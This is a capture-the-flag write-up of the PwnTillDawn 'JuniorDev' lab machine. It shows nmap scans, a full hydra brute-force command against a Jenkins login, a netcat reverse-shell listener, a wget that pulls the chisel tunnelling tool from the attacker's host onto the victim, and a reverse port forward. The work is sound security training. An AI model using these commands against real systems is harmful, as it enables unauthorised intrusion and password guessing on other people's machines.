---
title: PwnTillDawn - JuniorDev Writeup
published: true
---


This is a machine from the platform PwnTillDawn.

Check the platform by yourself and happy hacking:

[https://www.wizlynxgroup.com/](https://www.wizlynxgroup.com/)

[https://online.pwntilldawn.com/](https://online.pwntilldawn.com/)

Machine details:

> OS: Linux
>
> Rated as: Medium
>
> IP: 10.150.150.38


# [](#header-1)Manual OS fingerprinting.

I pinged the machine, and based on the [TTL](https://subinsb.com/default-device-ttl-values/) I can conclude it's a Linux box:

```bash

└─$ ping -c 1 10.150.150.38
PING 10.150.150.38 (10.150.150.38) 56(84) bytes of data.
64 bytes from 10.150.150.38: icmp_seq=1 ttl=63 time=163 ms

--- 10.150.150.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 162.577/162.577/162.577/0.000 ms
```

# [](#header-1)Port scanning.

I use two port scans, in the first one I discover all open ports. In the second I perform a nmap scan over those 
discovered ports trying to discover the service versions and also try basic nmap enum scripts.

## [](#header-2)First scan.

```bash
└─$ IP=10.150.150.38;nmap -p- --min-rate=5000 -n -sT -Pn -oG allports --open $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 22:40 EDT
Nmap scan report for 10.150.150.38
Host is up (0.16s latency).
Not shown: 62938 closed ports, 2595 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
30609/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds

```


*    In the first part I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.
*    `-p-`: Scan all TCP ports.
*    `--min-rate=5000`: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.
*    `-n`: Don't use DNS resolution (It goes faster this way).
*    `-sT`: Use tcp connect scan. I prefer this rather than the default (stealth).
*    `-Pn`: Don't do host discovery on the machine, it can save me some time, but before the scan I always test reachability to the machine.
*    `-oG allports`: Saves the nmap output in grepable format to a file called **allports**.
*    `--open`: Only shows me open ports.
*    `$IP`: This is where i call my env variable the IP of the machine.


When I'm facing some fancy bash commands that at first sight I don't clearly understand there is a very useful resource (Thanks Henry): [https://explainshell.com/](https://explainshell.com/explain?cmd=IP%3D10.150.150.38%3Bnmap+-p-+--min-rate%3D5000+-n+-sT+-Pn+-oG+allports+--open+%24IP)


Remember I saved the output as nmap grepable format? Well that was because I use a bash function that extracts the open ports from there and place them in a bash env variable called ports. Thanks to [s4vitar](https://www.youtube.com/c/s4vitar/videos) for this:

```bash
function extract () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS=/ | tr '\n' ','| sed 's/.$//' )"
        echo "Open ports:  $ports"
        export ports=$(echo $ports | tr -d '\n')
}

```

After writting that function in the .zshrc file (this is my case, because I'm using zsh), and using the source command to reaload the config, this is the output:


```bash
└─$ extract allports                                                                   
Open ports:  22,30609
```

## [](#header-2) Second scan.

```bash
└─$ nmap -p$ports --min-rate=1000 -sC -sV -n -Pn -oN targeted $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 23:34 EDT
Nmap scan report for 10.150.150.38
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
30609/tcp open  http    Jetty 9.4.27.v20200227
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.71 seconds
```

*    `-p$ports`: Only scan the ports I discovered from the previous scan.
*    `--min-rate=1000`: Fast scan.
*    `-sC`: Perform nmap default scripts scan.
*    `-sV`: Do version detection.
*    `-n`: Don't do DNS resolution.
*    `-Pn`: Don't do host discovery.
*    `-oN targeted`: Save the output to a file called targeted, using normal format.
*    `$IP`: This is the variable containing the IP.


# [](#header-1)Search for vulnerable versions.

Once are identified the service versions, let's take a look in searchsploit:

```bash
└─$ searchsploit openssh 7.9
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

```bash
└─$ searchsploit jetty 9.4  
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

Nothing useful found here.


# [](#header-1)Jenkins login page.

When we visit the web service on port 30609 it shows a Jenkins login page:

![](assets/jenkins_login.png)

I [found](https://www.shellhacks.com/jenkins-default-password-username/) that the default jenkins username is `admin`, and after trying default easy passwords 
unsuccessfully I moved on and try to bruteforce the login page with `hydra`.

# [](#header-1)Login bruteforcing.

First I intercepted the login request with BurpSuite to find the parameters being sent:

![](assets/burp_login.png)

Then, the final hydra command looks like this:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid" -V -I -F
```

After a while it discovers the password:

```bash
...
[ATTEMPT] target 10.150.150.38 - login "admin" - pass "gloria" - 649 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.150.150.38 - login "admin" - pass "tyler" - 650 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.150.150.38 - login "admin" - pass "aaron" - 651 of 14344399 [child 0] (0/0)
[30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
[STATUS] attack finished for 10.150.150.38 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-08 20:30:18
```

The creds are `admin` : `matrix`

# [](#header-1)Jenkins code execution.

In the Script Console we can execute java code, and we can use it to execute system commands:

![](assets/jenkins_execution.png)

So we set up a listener and then execute a [code](https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/) to get a reverse shell:

![](assets/jenkins_rev.png)

And we're in:

```bash
└─$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.66.69.69] from (UNKNOWN) [10.150.150.38] 58262
whoami
jenkins
```

Then I followed [this](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) procedure to upgrade my rev shell to a very nice TTY.

# [](#header-1)Low priv shell as jenkins user.

Inside the machine, under the `/var/lib/jenkins` we found the FLAG70.txt:

![](assets/FLAG70.png)

Then if we perform a search for FLAG69 we found the following:

```bash
jenkins@dev1:~$ find / -name FLAG69* 2>/dev/null
/var/lib/jenkins/users/FLAG69_7705914462374786576
jenkins@dev1:~$
```

Which turns to be a directory. Inside it there is a `config.xml` file, and when we read it we found the first flag:

![](assets/FLAG69.png)

Doing some manual enumeration we discover port `8080` which wasn't showed as up in the intial nmap scan:

```bash
jenkins@dev1:~$ netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0    286 10.150.150.38:58264     10.66.69.69:6969       ESTABLISHED 636/bash            
tcp6       0      0 :::30609                :::*                    LISTEN      467/java            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       1      0 10.150.150.38:30609     10.66.69.69:48350      CLOSE_WAIT  467/java
```

# [](header-1)Port forwarding.

We transfer [chisel](https://github.com/jpillora/chisel/releases) tool to the victim machine to do the port forwarding.

```bash
jenkins@dev1:/tmp$ wget http://10.66.66.69:6971/chisel
--2020-07-29 11:04:48--  http://10.66.69.69:6971/chisel
Connecting to 10.66.69.69:6971... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3295912 (3.1M) [application/octet-stream]
Saving to: ‘chisel’

chisel                                     100%[========================================================================================>]   3.14M   230KB/s    in 14s     

2020-07-29 11:05:02 (233 KB/s) - ‘chisel’ saved [3295912/3295912]

jenkins@dev1:/tmp$
```

Setting up the chisel server on the attacking machine:

```bash
└─$ ./chisel server -port 7171 --reverse                                                                                                                              127 ⨯
2021/09/08 21:49:35 server: Reverse tunnelling enabled
2021/09/08 21:49:35 server: Fingerprint DHQvfo/V5XH2fPvjE630ikAnWDP3/GApoK5fkC/8ryk=
2021/09/08 21:49:35 server: Listening on http://0.0.0.0:7171
```

And then wer fire it up as client mode on the victim machine:

```bash
jenkins@dev1:/tmp$ chmod +x chisel;./chisel client 10.66.69.69:7171 R:8080:127.0.0.1:8080
2020/07/29 11:10:24 client: Connecting to ws://10.66.69.69:7171
2020/07/29 11:10:25 client: Connected (Latency 160.054035ms)
```

# [](header-1)New web service in 8080.

After doing the port forwarding the next step is to visit manually the page:

![](assets/8080.png)

It is a calculator.

We found some interesting info looking at the source code:

```html
<html>
        <head>
                <title>Jr. dev py example</title>
        </head>
        <body>
                <div id="content">
                        <form action="/" method="post">
        <div>
                <input name="op1" type="text" />
                +
                <input name="op2" type="text" />
                =
                <input name="result" type="text" disabled="disabled" />
        </div>
        <div>
                <input type="submit" value="Calculate" />
        </div>

<!-- <img src="./static/FLAG.png"> -->


                </div>
        </body>

</html>

```

And whit that we got the third flag:

![](assets/FLAG71.png)

# [](header-1)PrivEsc via command injection in python webapp.

By the title of the web page we can conclude it is a python webapp.

Searching on the web payloads for command injection in python webapps I found this [article](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html).

And after trying different payloads I managed to get a reverse shell:

![](assets/rev_root.png)

And we receive a root shell and with that we capture the last flag:

![](assets/root_shell.png)

And that was it.

# [](header-1)Final thoughts.

Was not a very difficult machine, however the last part of the command injection was hard for me, I had to try different combination of payloads until I finally got the good one.
Was a very complete machine which involved bruteforcing techniques, command execution in jenkins, port forwarding and python code injection.

